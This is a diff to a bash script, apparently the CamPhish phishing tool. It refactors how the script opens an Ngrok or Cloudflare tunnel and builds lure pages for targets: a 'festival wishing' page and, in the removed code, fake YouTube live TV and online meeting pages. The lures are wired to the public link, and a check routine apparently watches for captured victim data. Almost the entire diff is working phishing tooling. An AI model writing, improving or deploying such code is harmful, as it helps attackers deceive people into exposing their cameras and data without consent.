+    printf "\e[1;31m[!] Could not get Ngrok URL. Possible reasons:\e[0m\n"
+    printf "\e[1;93m    - Invalid authtoken\e[0m\n"
+    printf "\e[1;93m    - On Android: enable hotspot\e[0m\n"
+    printf "\e[1;93m    - Ngrok already running: killall ngrok\e[0m\n"
+    printf "\e[1;93m    - Try manually: ./ngrok http 3333\e[0m\n"
+    exit 1
+  fi
 
-link=$(curl -s -N http://127.0.0.1:4040/api/tunnels | grep -o 'https://[^/"]*\.ngrok-free.app')
-if [[ -z "$link" ]]; then
-printf "\e[1;31m[!] Direct link is not generating, check following possible reason  \e[0m\n"
-printf "\e[1;92m[\e[0m*\e[1;92m] \e[0m\e[1;93m Ngrok authtoken is not valid\n"
-printf "\e[1;92m[\e[0m*\e[1;92m] \e[0m\e[1;93m If you are using android, turn hotspot on\n"
-printf "\e[1;92m[\e[0m*\e[1;92m] \e[0m\e[1;93m Ngrok is already running, run this command killall ngrok\n"
-printf "\e[1;92m[\e[0m*\e[1;92m] \e[0m\e[1;93m Check your internet connection\n"
-printf "\e[1;92m[\e[0m*\e[1;92m] \e[0m\e[1;93m Try running ngrok manually: ./ngrok http 3333\n"
-exit 1
-else
-printf "\e[1;92m[\e[0m*\e[1;92m] Direct link:\e[0m\e[1;77m %s\e[0m\n" $link
-fi
-payload_ngrok
-checkfound
+  printf "\e[1;92m[\e[0m*\e[1;92m] Link:\e[0m\e[1;77m %s\e[0m\n" "$link"
+  payload_ngrok "$link"
+  checkfound
+}
+
+# ─── Payload builders ─────────────────────────────────────────────────────────
+payload_cloudflare() {
+  local link="$1"
+  # Build index.php (landing/redirect page)
+  sed "s+forwarding_link+${link}+g" template.php > index.php
+  # Build index2.html (festival wishing page)
+  sed "s+forwarding_link+${link}+g" festivalwishes.html > index3.html
+  sed "s+fes_name+${fest_name}+g"   index3.html         > index2.html
+  rm -f index3.html
 }
 
 payload_ngrok() {
-link=$(curl -s -N http://127.0.0.1:4040/api/tunnels | grep -o 'https://[^/"]*\.ngrok-free.app')
-sed 's+forwarding_link+'$link'+g' template.php > index.php
-if [[ $option_tem -eq 1 ]]; then
-sed 's+forwarding_link+'$link'+g' festivalwishes.html > index3.html
-sed 's+fes_name+'$fest_name'+g' index3.html > index2.html
-elif [[ $option_tem -eq 2 ]]; then
-sed 's+forwarding_link+'$link'+g' LiveYTTV.html > index3.html
-sed 's+live_yt_tv+'$yt_video_ID'+g' index3.html > index2.html
-else
-sed 's+forwarding_link+'$link'+g' OnlineMeeting.html > index2.html
-fi
-rm -rf index3.html
+  local link="$1"
+  sed "s+forwarding_link+${link}+g" template.php > index.php
+  sed "s+forwarding_link+${link}+g" festivalwishes.html > index3.html
+  sed "s+fes_name+${fest_name}+g"   index3.html         > index2.html
+  rm -f index3.html
 }
 
+# ─── Main ─────────────────────────────────────────────────────────────────────
 camphish() {
-if [[ -e sendlink ]]; then
-rm -rf sendlink
-fi
+  [[ -e sendlink ]] && rm -f sendlink
 
-printf "\n-----Choose tunnel server----\n"    
-printf "\n\e[1;92m[\e[0m\e[1;77m01\e[0m\e[1;92m]\e[0m\e[1;93m Ngrok\e[0m\n"
-printf "\e[1;92m[\e[0m\e[1;77m02\e[0m\e[1;92m]\e[0m\e[1;93m CloudFlare Tunnel\e[0m\n"
-default_option_server="1"
-read -p $'\n\e[1;92m[\e[0m\e[1;77m+\e[0m\e[1;92m] Choose a Port Forwarding option: [Default is 1] \e[0m' option_server
-option_server="${option_server:-${default_option_server}}"
-select_template
+  # Ask festival name
+  read -p $'\n\e[1;92m[\e[0m+\e[1;92m] Enter festival name (e.g. Diwali, Eid, Holi): \e[0m' fest_name
+  fest_name="${fest_name//[[:space:]]/}"
+  if [[ -z "$fest_name" ]]; then
+    printf "\e[1;93m[!] Festival name cannot be empty.\e[0m\n"
+    camphish
+    return
+  fi
 
-if [[ $option_server -eq 2 ]]; then
-cloudflare_tunnel
-elif [[ $option_server -eq 1 ]]; then
-ngrok_server
-else
-printf "\e[1;93m [!] Invalid option!\e[0m\n"
-sleep 1
-clear
-camphish
-fi
-}
+  # Choose tunnel
+  printf "\n\e[1;92m-----Choose tunnel server-----\e[0m\n"
+  printf "\e[1;92m[\e[0m\e[1;77m01\e[0m\e[1;92m]\e[0m\e[1;93m Ngrok\e[0m\n"
+  printf "\e[1;92m[\e[0m\e[1;77m02\e[0m\e[1;92m]\e[0m\e[1;93m CloudFlare Tunnel\e[0m\n"
+  read -p $'\n\e[1;92m[\e[0m+\e[1;92m] Choose [Default: 2]: \e[0m' option_server
+  option_server="${option_server:-2}"
 
-select_template() {
-if [ $option_server -gt 2 ] || [ $option_server -lt 1 ]; then
-printf "\e[1;93m [!] Invalid tunnel option! try again\e[0m\n"
-sleep 1
-clear
-banner
-camphish
-else
-printf "\n-----Choose a template----\n"    
-printf "\n\e[1;92m[\e[0m\e[1;77m01\e[0m\e[1;92m]\e[0m\e[1;93m Festival Wishing\e[0m\n"
-printf "\e[1;92m[\e[0m\e[1;77m02\e[0m\e[1;92m]\e[0m\e[1;93m Live Youtube TV\e[0m\n"
-printf "\e[1;92m[\e[0m\e[1;77m03\e[0m\e[1;92m]\e[0m\e[1;93m Online Meeting\e[0m\n"
-default_option_template="1"
-read -p $'\n\e[1;92m[\e[0m\e[1;77m+\e[0m\e[1;92m] Choose a template: [Default is 1] \e[0m' option_tem
-option_tem="${option_tem:-${default_option_template}}"
-if [[ $option_tem -eq 1 ]]; then
-read -p $'\n\e[1;92m[\e[0m\e[1;77m+\e[0m\e[1;92m] Enter festival name: \e[0m' fest_name
-fest_name="${fest_name//[[:space:]]/}"
-elif [[ $option_tem -eq 2 ]]; then
-read -p $'\n\e[1;92m[\e[0m\e[1;77m+\e[0m\e[1;92m] Enter YouTube video watch ID: \e[0m' yt_video_ID
-elif [[ $option_tem -eq 3 ]]; then
-printf ""
-else
-printf "\e[1;93m [!] Invalid template option! try again\e[0m\n"
-sleep 1
-select_template
-fi
-fi
+  if [[ $option_server -eq 2 ]]; then
+    cloudflare_tunnel
+  elif [[ $option_server -eq 1 ]]; then
+    ngrok_server
+  else
+    printf "\e[1;93m[!] Invalid option.\e[0m\n"
+    sleep 1
+    camphish
+  fi
 }
 
 banner
